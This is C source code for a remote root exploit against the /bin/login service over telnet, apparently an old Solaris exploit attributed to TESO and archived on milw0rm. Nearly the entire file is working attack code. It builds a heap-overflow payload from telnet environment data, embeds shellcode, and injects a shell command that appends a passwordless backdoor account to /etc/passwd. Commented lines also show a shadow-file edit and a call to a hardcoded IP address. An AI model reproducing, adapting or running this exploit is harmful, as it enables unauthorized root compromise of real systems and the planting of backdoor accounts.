/*
 * 7350963 - /bin/login remote root explot SPARC/x86
 *
 * TESO CONFIDENTIAL - SOURCE MATERIALS
 *
 * This is unpublished proprietary source code of TESO Security.
 *
 * (C) COPYRIGHT TESO Security, 2001
 * All Rights Reserved
 *
 * bug found by scut 2001/12/20
 * thanks to halvar,scut,typo,random,edi,xdr.
 * special thanks to security.is.
 *
 * keep it private!
 * don't distribute!
 */

//#define X86_FULL_PACKAGE

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>

void usage()
{
  printf("usage: ./7350963 ip_of_the_victim\n");
}

void dump_hex(char *str,char *data,int len)
{
  int i;
  if(str)
    {
      printf("\n=======%s:%d========\n",str,len);
    }
  else
    {
      printf("\n=======================\n");
    }
  for(i=0; i < len ;i++)
    {
      printf("x%.2x\n", (data[i]&0xff));
    }
  printf("\n-----------------------\n");
  for(i=0; i < len ;i++)
    {
      if(data[i]==0x00)
	{
	  printf("|\n");
	}
      else
	{
	  printf("%c\n",data[i]);
	}
    }
  printf("\n");
  fflush(stdout);
}

int send_data(int sock,const char *send_data,int send_len)
{
  int wc;
  int rc;
  char recv_buf[1000];
  
  if(send_data && send_len > 0)
    {
      wc=send(sock,send_data,send_len,0);
    }
  rc=recv(sock,recv_buf,sizeof(recv_buf),0);
  
  if(rc > 0)
    {
      dump_hex("recv",recv_buf,rc);
    }
}

int main(int argc,char *argv[])
{
  int sock;
  struct sockaddr_in address;
  int i;
  
  char send_data_1[]=
  {
    0xff,0xfd,0x03,
    0xff,0xfb,0x18,
    0xff,0xfb,0x1f,
    0xff,0xfb,0x20,
    0xff,0xfb,0x21,
    0xff,0xfb,0x22,
    0xff,0xfb,0x27,
    0xff,0xfd,0x05,
    0xff,0xfb,0x23
  };
  char send_data_2[]=
  {
    0xff,0xfa,0x1f,0x00,0x50,0x00,0x18,
    0xff,0xf0,
    0xff,0xfc,0x24
  };
  char send_data_3[]=
  {
    0xff,0xfd,0x01,
    0xff,0xfc,0x01
  };
  
  char str_buffer[1024*30];
  int str_buffer_pos=0;
  char str_end[2]={0xd,0x0};
  
  char *env_str;
  int env_str_len;
  char env_1[4]={0xff,0xfa,0x18,0x00};
  char *terminal_name="xterm-debian";
  char env_2[6]={0xff,0xf0,0xff,0xfa,0x23,0x00};
  char *display="matter:0.0";
  char env_3[7]={0xff,0xf0,0xff,0xfa,0x27,0x00,0x00};
  char *display_var="DISPlAY";
  char display_delimiter[1]={0x01};
  char *display_value="matter:0.0";
  char *environ_str;
  int environ_str_len;
  int env_cur_pos=0;
  int env_num;
  
  char env_4[2]={0xff,0xf0};
  char  exploit_buffer[]="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\\r\n";
  char login_buffer[]=  "ji1=A ji2=A ji3=A ji4=A ji5=A ji6=A ji7=A ji8=A ji9=Z ji10=z\\\r\n\
                         ji11=B ji12=A ji13=A ji14=b ji15=A ji16=A ji17=A ji18=A ji19=B ji20=b\\\r\n\
                         ji21=C ji22=A ji23=A ji24=c ji25=A ji26=A ji27=A ji28=A ji29=C ji30=c\\\r\n\
                         ji32=D ji32=A ji33=A ji34=d ji35=A ji36=A ji37=A ji38=A ji39=D ji40=d\\\r\n\
                         ji41=E ji42=A ji43=A ji44=e j";
  char realfree_edx[]={0x83,0x83,0x83,0x83}; //0xdf9d6361 <realfree+81>: test   $0x1,%dl¸¦ ³Ñ±â±â À§ÇØ¼­
  char login_buffer1[]="=A j";
  
#ifdef X86_FULL_PACKAGE
  char t_delete_edi_plus_0x8[]={0x2f,0x80,0x06,0x08};
#else
  char t_delete_edi_plus_0x8[]={0x27,0x80,0x06,0x08};
#endif
  char t_delete_edi_plus_0xa[]="=A j";
  char t_delete_edi_plus_0x10[]={0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff};
  char login_buffer1_0[]="=A ji48=A j ";
#ifdef X86_FULL_PACKAGE
  char t_delete_edi_plus_0x20[]={0xf0,0x55,0x6,0x08};
#else
  char t_delete_edi_plus_0x20[]={0xe8,0x55,0x6,0x08};
#endif
  char login_buffer1_1[]="=\\\r\n\ji51=F ji52=A ji53=A ji54=f ji55=A ji56=A j=iheol i58=";
#ifdef X86_FULL_PACKAGE
  char t_delete2_param1[]={0x29,0x80,0x06,0x08};
#else
  char t_delete2_param1[]={0x21,0x80,0x06,0x08};
#endif
  char login_buffer1_2[]="6=8";
  char link_pos[]={0x97,0xff,0xff,0xff,0xff,0xff,0xff};
  //Ã¹¹øÂ° A -1 ÀÓ
  char login_buffer2[]="A=AB";
  //    0x080654d4->0x080656ac at 0x000054d4: .got ALLOC LOAD DATA HAS_CONTENTS
  //0x80655a4 <_GLOBAL_OFFSET_TABLE_+208>:  0xdf9bd0b8 <strncpy>
  //(gdb) print/x 0x80655a4 - 0x20
  //$1 = 0x8065584
#ifdef X86_FULL_PACKAGE
  char t_delete2_edi_plus_0x8[]={0x90,0x55,0x06,0x08}; //strncpy-0x20,ecx
#else
  char t_delete2_edi_plus_0x8[]={0x84,0x55,0x06,0x08}; //strncpy-0x20,ecx
#endif
  char login_buffer2_0[]="GHIJ";
  char t_delete2_edi_plus_0x10[]={0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff};
  char login_buffer2_1[]="OPQRSTUVWXYZ";
  
  //0x806810d <inputline+780>:       'A' <repeats 82 times>, "\n"
#ifdef X86_FULL_PACKAGE
  char t_delete2_edi_plus_0x20[]={0x06,0x81,0x06,0x08}; //shellcode,eax
#else
  char t_delete2_edi_plus_0x20[]={0xfe,0x80,0x06,0x08}; //shellcode,eax
#endif
  
  //0x8067e01 <inputline>: "heowahfoihewobhfoiewhiofhoewhofhoeiwhofwhofhiewwhfoiew
  char login_buffer2_2[]="efghijklmnopqrstuvwxyz0123456789A\\\r\n\
    jk11=A jm21=C nj31=A jo41=A pi51=A jq61=A jr71=A js81=g jt91=A ju01=A jv11=A 
    jw21=B jy"; //31=A z";//4=A k2=A k3=A k";
  
#ifdef X86_FULL_PACKAGE
  //char strncpy_src[]={0xf9,0x3b,0x05,0x08};
  char strncpy_src[]={0x31,0x80,0x06,0x08};
  
#else
  char strncpy_src[]={0xf1,0x3b,0x05,0x08};
  
#endif
  
  char env_buffer[]="hi1=A hi2=A hi3=A hi";
  char pam_input_output_eax[]={0x48,0x8a,0x06,0x08}; //0x8068a48
  char env_buffer0[]="hi5=A hi6=A hi7=A hi";
  
#ifdef X86_FULL_PACKAGE
  char free_dest_buffer[]={0x31,0x80,0x06,0x08};
  
#else
  char free_dest_buffer[]={0x29,0x80,0x06,0x08};
#endif
  
  char env_buffer2[]="zi9=";
#ifdef X86_FULL_PACKAGE
  char free_dest_buffer2[]={0x31,0x80,0x06,0x08};
  
#else
  char free_dest_buffer2[]={0x29,0x80,0x06,0x08};
  
#endif
  
  char exp_buffer0[]="hello";
  char jmp_code[]={0xeb,0xc};
  char exp_buffer1[]="\\\r\nhhhhhhhhhhh";
  char shellcode[]=
  {
    0xeb,0x1d,
    0x5e,           /*popl   %esi*/
    0x33,0xc0,       /*xorl   %eax,%eax*/
    0x50,           /*pushl  %eax - ,0x0*/
#ifdef X86_FULL_PACKAGE
    0x68,0x46,0x81,0x06,0x08,
    0x68,0x43,0x81,0x06,0x08,
    0x68,0x40,0x81,0x06,0x08,
    0x68,0x38,0x81,0x06,0x08,
#else
    0x68,0x3e,0x81,0x06,0x08,
    0x68,0x3b,0x81,0x06,0x08,
    0x68,0x38,0x81,0x06,0x08,
    0x68,0x30,0x81,0x06,0x08,
#endif
#ifdef X86_FULL_PACKAGE
    0xe8,0x25,0xa0,0xfe,0xff,0xff, /*call execve: 0xfffe9fee*/
#else
    0xe8,0x2e,0xa0,0xfe,0xff,0xff, /*call execve: 0xfffe9fee*/
#endif
    0xe8,0xde,0xff,0xff,0xff,0xff,0xff,0xff /*call again*/
  };
  char exec_argv0[]="/bin/sh";
  char exec_argv1[]="sh";
  char exec_argv2[]="-c";
  char exec_argv3[]="/bin/echo met::463:1::/:/bin/sh>>/etc/passwd;";
  //"/bin/echo met::11652::::::>>/etc/shadow;";
  //"/bin/finger @210.111.69.137";
  //211.59.123.155";
  char extra_buffer[]="hihihiifhewiohfiowehfiohweiofhiowehfoihefe\\\r\n";
#ifdef X86_FULL_PACKAGE
  char free_dest_buffer3[]={0x31,0x80,0x06,0x08};
#else
  char free_dest_buffer3[]={0x29,0x80,0x06,0x08};
#endif
  char env_buffer5[]="70=b \\\r\n\hr371=b hs372=";
  char pam_input_output_eax2[]={0xf5,0x3b,0x05,0x08};
  char env_buffer5_0[]="473=";
  char pam_get_authtok_eax[]={0xf6,0x3b,0x05,0x08}; //0x8053bfa ÀÓ½Ãº¯Åë
  char pam_get_data_esi[]={0xa8,0xb1,0x06,0x08};//0x806b1a8  display="";  terminal_name="";
  
  if (argc < 2)
    {
      usage();
      exit(-1);
    }
  
  env_str_len= sizeof(env_1) + strlen(terminal_name) + sizeof(env_2)+strlen(display) + sizeof(env_3) + strlen(display_var) + sizeof(display_delimiter) + strlen(display_value) + sizeof(env_4);
  
  env_str=(char *)calloc(1,env_str_len);
  if(env_str)
    {
      env_cur_pos=0;
      memcpy(env_str+env_cur_pos,env_1,sizeof(env_1));
      env_cur_pos += sizeof(env_1);
      memcpy(env_str + env_cur_pos,terminal_name,strlen(terminal_name));
      env_cur_pos += strlen(terminal_name);
      memcpy(env_str + env_cur_pos,env_2,sizeof(env_2));
      env_cur_pos += sizeof(env_2);
      memcpy(env_str + env_cur_pos,display,strlen(display));
      env_cur_pos += strlen(display);
      memcpy(env_str + env_cur_pos,env_3,sizeof(env_3));
      env_cur_pos += sizeof(env_3);
      memcpy(env_str + env_cur_pos,display_var,strlen(display_var));
      env_cur_pos += strlen(display_var);
      memcpy(env_str + env_cur_pos,display_delimiter,sizeof(display_delimiter));
      env_cur_pos+=sizeof(display_delimiter);
      memcpy(env_str + env_cur_pos,display_value,strlen(display_value));
      env_cur_pos += strlen(display_value);
      memcpy(env_str + env_cur_pos,env_4,sizeof(env_4));
      env_cur_pos += sizeof(env_4);
    }
  
  /*socket operation*/
  sock=socket(AF_INET,SOCK_STREAM,0);
  if(sock < 0)
    {
      perror("socket");
      return -1;
    }
  address.sin_family=AF_INET;
  address.sin_port=htons(23);
  //inet_pton(AF_INET,argv[1],&address.sin_addr); //on some system no inet_pton exists
  address.sin_addr.s_addr=inet_addr(argv[1]);
  
  if(connect(sock,(struct sockaddr *)&address,sizeof(address))<0)
    {
      perror("connect");
      return -1;
    }
  send_data(sock,NULL,0);
  send_data(sock,send_data_1,sizeof(send_data_1));
  send_data(sock,send_data_2,sizeof(send_data_2));
  
  //dump_hex("env",env_str,env_cur_pos);
  send_data(sock,env_str,env_cur_pos);
  free(env_str);
  
  send_data(sock,send_data_3,sizeof(send_data_3));
  
  str_buffer_pos=0;
  
  memcpy(str_buffer + str_buffer_pos,exploit_buffer,strlen(exploit_buffer));
  str_buffer_pos += strlen(exploit_buffer);
  
  strcpy(str_buffer + str_buffer_pos,login_buffer);
  str_buffer_pos += strlen(login_buffer);
  
  memcpy(str_buffer + str_buffer_pos,realfree_edx,sizeof(realfree_edx));
  str_buffer_pos += sizeof(realfree_edx);
  
  strcpy(str_buffer + str_buffer_pos,login_buffer1);
  str_buffer_pos += strlen(login_buffer1);
  
  memcpy(str_buffer + str_buffer_pos,t_delete_edi_plus_0x8,sizeof(t_delete_edi_plus_0x8));
  str_buffer_pos += sizeof(t_delete_edi_plus_0x8);
  
  memcpy(str_buffer + str_buffer_pos,t_delete_edi_plus_0xa,strlen(t_delete_edi_plus_0xa));
  str_buffer_pos += strlen(t_delete_edi_plus_0xa);
  
  memcpy(str_buffer + str_buffer_pos,t_delete_edi_plus_0x10,sizeof(t_delete_edi_plus_0x10));
  str_buffer_pos += sizeof(t_delete_edi_plus_0x10);
  
  strcpy(str_buffer + str_buffer_pos,login_buffer1_0);
  str_buffer_pos += strlen(login_buffer1_0);
  
  memcpy(str_buffer + str_buffer_pos,t_delete_edi_plus_0x20,sizeof(t_delete_edi_plus_0x20));
  str_buffer_pos += sizeof(t_delete_edi_plus_0x20);
  
  strcpy(str_buffer + str_buffer_pos,login_buffer1_1);
  str_buffer_pos += strlen(login_buffer1_1);
  
  memcpy(str_buffer + str_buffer_pos,t_delete2_param1,sizeof(t_delete2_param1));
  str_buffer_pos += sizeof(t_delete2_param1);
  
  strcpy(str_buffer + str_buffer_pos,login_buffer1_2);
  str_buffer_pos += strlen(login_buffer1_2);
  
  memcpy(str_buffer + str_buffer_pos,link_pos,sizeof(link_pos));
  str_buffer_pos += sizeof(link_pos);
  
  strcpy(str_buffer + str_buffer_pos,login_buffer2);
  str_buffer_pos += strlen(login_buffer2);
  
  memcpy(str_buffer + str_buffer_pos,t_delete2_edi_plus_0x8,sizeof(t_delete2_edi_plus_0x8));
  str_buffer_pos += sizeof(t_delete2_edi_plus_0x8);
  
  strcpy(str_buffer + str_buffer_pos,login_buffer2_0);
  str_buffer_pos += strlen(login_buffer2_0);
  
  memcpy(str_buffer + str_buffer_pos,t_delete2_edi_plus_0x10,sizeof(t_delete2_edi_plus_0x10));
  str_buffer_pos += sizeof(t_delete2_edi_plus_0x10);
  
  strcpy(str_buffer + str_buffer_pos,login_buffer2_1);
  str_buffer_pos += strlen(login_buffer2_1);
  
  memcpy(str_buffer + str_buffer_pos,t_delete2_edi_plus_0x20,sizeof(t_delete2_edi_plus_0x20));
  str_buffer_pos +=  sizeof(t_delete2_edi_plus_0x20);
  
  strcpy(str_buffer + str_buffer_pos,login_buffer2_2);
  str_buffer_pos += strlen(login_buffer2_2);
  
  memcpy(str_buffer + str_buffer_pos,strncpy_src,sizeof(strncpy_src));
  str_buffer_pos += sizeof(strncpy_src);
  
  memcpy(str_buffer + str_buffer_pos,env_buffer,strlen(env_buffer));
  str_buffer_pos += strlen(env_buffer);
  
  memcpy(str_buffer + str_buffer_pos,pam_input_output_eax,sizeof(pam_input_output_eax));
  str_buffer_pos += sizeof(pam_input_output_eax);
  
  memcpy(str_buffer + str_buffer_pos,env_buffer,strlen(env_buffer0));
  str_buffer_pos += strlen(env_buffer0);
  
  memcpy(str_buffer + str_buffer_pos,free_dest_buffer,sizeof(free_dest_buffer));
  str_buffer_pos += sizeof(free_dest_buffer);
  
  memcpy(str_buffer + str_buffer_pos,env_buffer2,strlen(env_buffer2));
  str_buffer_pos += strlen(env_buffer2);
  
  memcpy(str_buffer + str_buffer_pos,free_dest_buffer2,sizeof(free_dest_buffer2));
  str_buffer_pos += sizeof(free_dest_buffer2);
  
  strcpy(str_buffer + str_buffer_pos,exp_buffer0);
  str_buffer_pos    += strlen(exp_buffer0);
  
  memcpy(str_buffer + str_buffer_pos,jmp_code,sizeof(jmp_code));
  str_buffer_pos    += sizeof(jmp_code);
  
  strcpy(str_buffer + str_buffer_pos,exp_buffer1);
  str_buffer_pos    += strlen(exp_buffer1);
  
  memcpy(str_buffer + str_buffer_pos,shellcode,sizeof(shellcode));
  str_buffer_pos    += sizeof(shellcode);
  
  strcpy(str_buffer + str_buffer_pos,exec_argv0);
  str_buffer_pos    += strlen(exec_argv0)+1;
  
  strcpy(str_buffer + str_buffer_pos,exec_argv1);
  str_buffer_pos    += strlen(exec_argv1)+1;
  
  strcpy(str_buffer + str_buffer_pos,exec_argv2);
  str_buffer_pos    += strlen(exec_argv2)+1;
  
  strcpy(str_buffer + str_buffer_pos,exec_argv3);
  str_buffer_pos    += strlen(exec_argv3)+1;
  
  memcpy(str_buffer + str_buffer_pos,str_end,strlen(str_end));
  str_buffer_pos += strlen(str_end);
  
  {
    char buf[100];
    fgets(buf,100,stdin);
  }
  printf("sending login!\n");
  fflush(stdout);
  send_data(sock,str_buffer,str_buffer_pos);
  send_data(sock,NULL,0);
  printf("\n\n\npress return to send password\n...");
  
  {
    char buf[100];
    fgets(buf,100,stdin);
  }
  send_data(sock,str_buffer,strlen(str_buffer)+1);
  printf("\n\n\nwaiting for the realfree & t_delete to be called!\n...\n\n");
  fflush(stdout);
  sleep(30);
  return 42;
}


// milw0rm.com [2001-12-20]
